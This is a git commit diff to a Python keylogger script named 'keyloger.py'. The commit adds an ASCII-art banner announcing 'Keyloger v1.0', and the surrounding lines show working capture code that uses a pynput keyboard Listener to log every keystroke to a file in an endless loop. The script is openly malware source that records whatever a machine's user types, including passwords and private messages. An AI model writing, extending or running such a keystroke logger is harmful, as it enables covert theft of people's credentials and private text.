dad5bb2d893ac2cbbc208ca7a5e258c17eaa1a9b
Mosaed <75680991+MosaedH@users.noreply.github.com>
2023-04-08 22:07:10 +0300

    Update keyloger.py

--- keyloger/keyloger.py
+++ keyloger/keyloger.py
@@ -1,6 +1,33 @@
+
 import logging
 import os
 from pynput.keyboard import Listener
+
+def banner():
+     print('___| Keyloger v1.0 |___')
+     print('+[+[+[ Made in Hail ]+]+]+')
+     print('''
+     مرحبا
+   __  __                          _
+  |  \/  |                        | |
+  | \  / | ___  ___  __ _  ___  __| |
+  | |\/| |/ _ \/ __|/ _` |/ _ \/ _` |
+  | |  | | (_) \__ \ (_| |  __/ (_| |
+  |_|  |_|\___/|___/\__,_|\___|\__,_|
+                                     \\
+                                      \\
+                                      Made at Alko5'
+                           _
+                          | |
+         _         ____   | |                      ____
+        | |      // ___|  | |     _   _   _       /    \\
+    ____|_|_____|/_____   | |____| | | | | |_____(  ()  )
+   |____|_|______\____\   |_|____|_|_|_|_|_|______\____/
+
+   
+
+     ''')
+
 
 log_Directory = os.getcwd() + '/'  # where save file
 print(os.getcwd()) # directory
@@ -12,6 +39,8 @@ def on_press(key):
     logging.info(key)
     # when press key save the key in file
 
+banner()
 
 with Listener(on_press=on_press) as listener:
     listener.join()  # infinite cicle
+
